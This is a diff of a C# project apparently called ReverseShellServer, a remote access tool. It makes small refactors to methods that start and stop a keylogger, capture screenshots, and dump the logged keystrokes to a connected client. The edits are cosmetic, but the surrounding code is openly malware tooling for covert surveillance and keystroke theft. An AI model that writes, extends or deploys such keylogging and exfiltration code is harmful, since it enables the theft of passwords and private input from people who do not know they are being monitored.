@@ -30,7 +30,6 @@ namespace ReverseShellServer
         /// <param name="bw"></param>
         /// <param name="br"></param>
         /// <param name="sw"></param>
-        /// <param name="keyLoggerManager"></param>
         public ServerTools(BinaryWriter bw, BinaryReader br, StreamWriter sw)
         {
             this.bw = bw;
@@ -220,7 +219,7 @@ namespace ReverseShellServer
 
 
         [DllImport("shcore.dll")]
-        private static extern int SetProcessDpiAwareness(ProcessDPIAwareness value);
+        static extern int SetProcessDpiAwareness(ProcessDPIAwareness value);
         #endregion Screenshot
 
         // TODO : play sound
@@ -254,16 +253,10 @@ namespace ReverseShellServer
         }
 
 
-        void StartKeylogger()
-        {
-            keyLoggerManager.StartListening();
-        }
+        void StartKeylogger() => keyLoggerManager.StartListening();
 
 
-        void StopKeylogger()
-        {
-            keyLoggerManager.StopListening();
-        }
+        void StopKeylogger() => keyLoggerManager.StopListening();
 
 
         void SendKeyloggerStatusToClient()
@@ -283,7 +276,7 @@ namespace ReverseShellServer
             sw.WriteLine("{Keylogger:dump}");
             sw.Flush();
 
-            var logs = MainWindow.keyLoggerManager.DumpLogs(); //keyLoggerManager.DumpLogs();
+            var logs = MainWindow.keyLoggerManager.DumpLogs();
 
             sw.WriteLine(logs);
             sw.Flush();
